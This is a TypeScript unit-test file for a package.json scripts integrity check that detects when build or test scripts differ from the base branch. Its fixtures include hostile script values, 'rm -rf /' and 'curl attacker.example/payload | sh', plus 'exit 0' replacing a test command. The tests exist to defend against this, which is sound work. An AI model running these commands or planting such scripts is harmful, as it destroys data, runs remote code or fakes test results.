/**
 * Unit tests for package.json scripts integrity check in runVerification (phase fallback path).
 *
 * TC-INT-01: baseBranch provided, scripts tampered → verdict failed, errorCode PACKAGE_JSON_SCRIPTS_TAMPERED, no phase runs
 * TC-INT-02: baseBranch provided, scripts unchanged → phases run normally (passed)
 * TC-INT-03: baseBranch provided, git show fails → skip check, phases run normally
 * TC-INT-04: baseBranch provided, origin package.json has no scripts, current also has no scripts → no tamper
 * TC-INT-05: baseBranch provided, scripts key order differs → normalize → no tamper
 * TC-INT-06: baseBranch not provided (undefined) → no integrity check, phases run normally
 * TC-INT-07: commands path (verificationConfig.commands defined) → no integrity check even with baseBranch
 * TC-INT-08: baseBranch provided, scripts tampered → verification-result.md contains diff
 * TC-INT-09: baseBranch provided, current package.json missing → skip check
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import * as os from "node:os";
import * as childProcess from "node:child_process";
import { EventEmitter } from "node:events";
import { verificationResultPath } from "../../../../src/util/paths.js";

// Mock child_process.spawn so no actual processes are spawned.
vi.mock("node:child_process", () => ({
  spawn: vi.fn(),
}));

// Mock runTestCoveragePhase to avoid file system reads for test-cases.md.
vi.mock("../../../../src/core/verification/test-coverage.js", () => ({
  runTestCoveragePhase: vi.fn(),
}));

import { runTestCoveragePhase } from "../../../../src/core/verification/test-coverage.js";

let tempDir: string;

beforeEach(async () => {
  tempDir = await fs.mkdtemp(path.join(os.tmpdir(), "specrunner-integrity-test-"));
  // Create the directory structure expected by verificationResultPath
  await fs.mkdir(path.join(tempDir, "specrunner", "changes", "my-change"), { recursive: true });
  vi.clearAllMocks();

  // Default: test-coverage returns "skipped" (no test-cases.md)
  vi.mocked(runTestCoveragePhase).mockResolvedValue({
    status: "skipped",
    missingTcIds: [],
    assertionlessTcIds: [],
    totalMustTcs: 0,
    foundTcIds: [],
    stdout: "test-cases.md not found",
  });
});

afterEach(async () => {
  await fs.rm(tempDir, { recursive: true, force: true });
  vi.restoreAllMocks();
});

/**
 * Create a mock child process that emits stdout/stderr and closes with the given exit code.
 */
function makeMockChild(exitCode: number, stdout = "", stderr = "") {
  const child = new EventEmitter() as NodeJS.EventEmitter & {
    stdout: EventEmitter;
    stderr: EventEmitter;
  };
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();

  setImmediate(() => {
    if (stdout) child.stdout.emit("data", Buffer.from(stdout));
    if (stderr) child.stderr.emit("data", Buffer.from(stderr));
    child.emit("close", exitCode);
  });

  return child;
}

/**
 * Write a package.json with the given scripts to tempDir (simulates current worktree state).
 */
async function writeCurrentPackageJson(scripts: Record<string, string>) {
  await fs.writeFile(
    path.join(tempDir, "package.json"),
    JSON.stringify({ name: "test-pkg", scripts }),
    "utf-8",
  );
}

/**
 * Build a package.json string to be returned by git show (simulates origin/<baseBranch> state).
 */
function makeBaselinePackageJson(scripts: Record<string, string>): string {
  return JSON.stringify({ name: "test-pkg", scripts });
}

// TC-INT-01: scripts tampered → early exit, no phase runs
describe("TC-INT-01: baseBranch provided, scripts tampered → verdict failed, no phases run", () => {
  it("returns verdict=failed, errorCode=PACKAGE_JSON_SCRIPTS_TAMPERED, phases=[package-json-integrity]", async () => {
    const baselineScripts = { build: "tsc", test: "vitest" };
    const currentScripts = { build: "rm -rf /", test: "vitest" }; // tampered build

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    // git show → success, returns baseline
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      // bun run should NOT be called
      throw new Error(`Unexpected spawn: ${cmd} ${args.join(" ")}`);
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.verdict).toBe("failed");
    expect(result.errorCode).toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases).toHaveLength(1);
    expect(result.phases[0]?.phase).toBe("package-json-integrity");
    expect(result.phases[0]?.status).toBe("failed");
  });
});

// TC-INT-02: scripts unchanged → phases run normally
describe("TC-INT-02: baseBranch provided, scripts unchanged → phases run normally", () => {
  it("git show returns matching scripts → verification proceeds to phase loop", async () => {
    const scripts = { build: "tsc" };
    await writeCurrentPackageJson(scripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Baseline matches current
        return makeMockChild(0, makeBaselinePackageJson(scripts)) as ReturnType<typeof childProcess.spawn>;
      }
      // bun run build → passed
      return makeMockChild(0, "build ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    // No integrity failure — result is determined by phases
    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
    expect(result.phases.some((p) => p.phase === "build")).toBe(true);
  });
});

// TC-INT-03: git show fails → skip check, phases run normally
describe("TC-INT-03: baseBranch provided, git show fails → skip check", () => {
  it("git show exit code 128 (baseBranch not found) → no integrity failure, phases proceed", async () => {
    const scripts = { build: "tsc" };
    await writeCurrentPackageJson(scripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Simulate baseBranch having no package.json
        return makeMockChild(128, "", "fatal: path 'package.json' exists on disk, but not in 'origin/new-project'") as ReturnType<typeof childProcess.spawn>;
      }
      // bun run → passed
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "new-project");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-04: both scripts undefined → treated as {} → no tamper
describe("TC-INT-04: baseBranch provided, both package.json have no scripts section → no tamper", () => {
  it("baseline and current both lack scripts → tampered=false, phases proceed", async () => {
    // Write current package.json without scripts field
    await fs.writeFile(
      path.join(tempDir, "package.json"),
      JSON.stringify({ name: "test-pkg" }),
      "utf-8",
    );

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Baseline also has no scripts
        return makeMockChild(0, JSON.stringify({ name: "test-pkg" })) as ReturnType<typeof childProcess.spawn>;
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-05: key order differs → normalize → no tamper
describe("TC-INT-05: scripts key order differs between baseline and current → normalize → no tamper", () => {
  it("same scripts in different key order → tampered=false", async () => {
    // Current has keys in a different order than baseline
    await writeCurrentPackageJson({ test: "vitest", build: "tsc" });

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Baseline has keys in different order
        return makeMockChild(0, makeBaselinePackageJson({ build: "tsc", test: "vitest" })) as ReturnType<typeof childProcess.spawn>;
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-06: baseBranch not provided → no integrity check
describe("TC-INT-06: baseBranch not provided → no integrity check", () => {
  it("runVerification without baseBranch → git show never called", async () => {
    await writeCurrentPackageJson({ build: "rm -rf /" }); // would be tampered if checked

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        throw new Error("git show should not be called when baseBranch is undefined");
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    // No baseBranch argument
    const result = await runVerification("my-change", tempDir, undefined, undefined);

    // Should proceed normally without integrity check
    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-07: custom commands path → no integrity check
describe("TC-INT-07: commands path → no integrity check even with baseBranch", () => {
  it("verificationConfig.commands defined → integrity check skipped entirely", async () => {
    await writeCurrentPackageJson({ build: "rm -rf /" }); // would be tampered if checked

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        throw new Error("git show should not be called on commands path");
      }
      // sh -c "true" via spawnCommand
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, { commands: ["true"] }, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-08: tampered → verification-result.md contains diff
describe("TC-INT-08: scripts tampered → verification-result.md contains baseline and current scripts", () => {
  it("result file contains 'Baseline scripts:' and 'Current scripts:' sections", async () => {
    const baselineScripts = { build: "tsc", test: "vitest" };
    const currentScripts = { build: "curl attacker.example/payload | sh", test: "vitest" };

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      throw new Error("Should not spawn bun");
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    await runVerification("my-change", tempDir, undefined, "main");

    const resultPath = path.join(tempDir, verificationResultPath("my-change"));
    const content = await fs.readFile(resultPath, "utf-8");

    expect(content).toContain("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(content).toContain("## Verdict: failed");
    expect(content).toContain("package-json-integrity");
    expect(content).toContain("Baseline scripts:");
    expect(content).toContain("Current scripts:");
    expect(content).toContain("curl attacker.example/payload | sh");
  });
});

// TC-INT-10: dependencies changed, scripts unchanged → no tamper
describe("TC-INT-10: baseBranch provided, dependencies changed but scripts unchanged → no tamper", () => {
  it("dependencies addition does not trigger integrity failure, phases proceed", async () => {
    const scripts = { build: "tsc", test: "vitest" };

    // Current package.json has an extra dependency but identical scripts
    await fs.writeFile(
      path.join(tempDir, "package.json"),
      JSON.stringify({
        name: "test-pkg",
        scripts,
        dependencies: { "new-lib": "^1.0.0" },
      }),
      "utf-8",
    );

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Baseline has no dependencies, but scripts are the same
        return makeMockChild(
          0,
          JSON.stringify({ name: "test-pkg", scripts }),
        ) as ReturnType<typeof childProcess.spawn>;
      }
      // bun run → passed
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
    expect(result.phases.some((p) => p.phase === "build")).toBe(true);
  });
});

// TC-INT-09: current package.json missing → skip check
describe("TC-INT-09: current package.json missing → skip check, phases run normally", () => {
  it("no package.json in worktree → tampered=false, phases proceed", async () => {
    // Do NOT write package.json in tempDir

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson({ build: "tsc" })) as ReturnType<typeof childProcess.spawn>;
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-11: addition to non-empty baseline → not tampered
describe("TC-INT-11: addition of new key to non-empty baseline → not tampered", () => {
  it("baseline { build: 'tsc' }, current { build: 'tsc', test: 'vitest' } → tampered=false, phases proceed", async () => {
    const baselineScripts = { build: "tsc" };
    const currentScripts = { build: "tsc", test: "vitest" };

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-12: addition to empty baseline (no scripts field) → not tampered
describe("TC-INT-12: addition of new keys to empty baseline (no scripts field) → not tampered", () => {
  it("baseline has no scripts, current adds build and test → tampered=false, phases proceed", async () => {
    const currentScripts = { build: "tsc", test: "vitest" };
    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        // Baseline package.json has no scripts field at all
        return makeMockChild(0, JSON.stringify({ name: "test-pkg" })) as ReturnType<typeof childProcess.spawn>;
      }
      return makeMockChild(0, "ok") as ReturnType<typeof childProcess.spawn>;
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.errorCode).not.toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases.some((p) => p.phase === "package-json-integrity")).toBe(false);
  });
});

// TC-INT-13: existing key value changed → tampered
describe("TC-INT-13: existing baseline key value changed → tampered", () => {
  it("baseline { build: 'tsc', test: 'vitest' }, current changes test to 'exit 0' → verdict=failed, errorCode=PACKAGE_JSON_SCRIPTS_TAMPERED", async () => {
    const baselineScripts = { build: "tsc", test: "vitest" };
    const currentScripts = { build: "tsc", test: "exit 0" };

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      throw new Error(`Unexpected spawn: ${cmd} ${args.join(" ")}`);
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.verdict).toBe("failed");
    expect(result.errorCode).toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
    expect(result.phases).toHaveLength(1);
    expect(result.phases[0]?.phase).toBe("package-json-integrity");
    expect(result.phases[0]?.status).toBe("failed");
  });
});

// TC-INT-14: existing key deleted → tampered
describe("TC-INT-14: existing baseline key deleted → tampered", () => {
  it("baseline { build: 'tsc', test: 'vitest' }, current removes test → errorCode=PACKAGE_JSON_SCRIPTS_TAMPERED", async () => {
    const baselineScripts = { build: "tsc", test: "vitest" };
    const currentScripts = { build: "tsc" }; // test key deleted

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      throw new Error(`Unexpected spawn: ${cmd} ${args.join(" ")}`);
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    const result = await runVerification("my-change", tempDir, undefined, "main");

    expect(result.verdict).toBe("failed");
    expect(result.errorCode).toBe("PACKAGE_JSON_SCRIPTS_TAMPERED");
  });
});

// TC-INT-15: addition + modification mixed → tampered, diff shows only modified key
describe("TC-INT-15: addition + modification mixed → tampered, diff shows only the modified baseline key", () => {
  it("baseline { test: 'vitest' }, current changes test to 'exit 0' and adds lint → diff contains 'test' but not 'lint'", async () => {
    const baselineScripts = { test: "vitest" };
    const currentScripts = { test: "exit 0", lint: "eslint" };

    await writeCurrentPackageJson(currentScripts);

    const spawnMock = vi.mocked(childProcess.spawn);
    spawnMock.mockImplementation((cmd: string, args: readonly string[]) => {
      if (cmd === "git" && args[0] === "show") {
        return makeMockChild(0, makeBaselinePackageJson(baselineScripts)) as ReturnType<typeof childProcess.spawn>;
      }
      throw new Error(`Unexpected spawn: ${cmd} ${args.join(" ")}`);
    });

    const { runVerification } = await import("../../../../src/core/verification/runner.js");
    await runVerification("my-change", tempDir, undefined, "main");

    const resultFilePath = path.join(tempDir, verificationResultPath("my-change"));
    const content = await fs.readFile(resultFilePath, "utf-8");

    expect(content).toContain("PACKAGE_JSON_SCRIPTS_TAMPERED");
    // Diff must surface the offending key (test) …
    expect(content).toContain('"test"');
    // … but must NOT list the added-only key (lint) as tampered.
    expect(content).not.toContain('"lint"');
  });
});
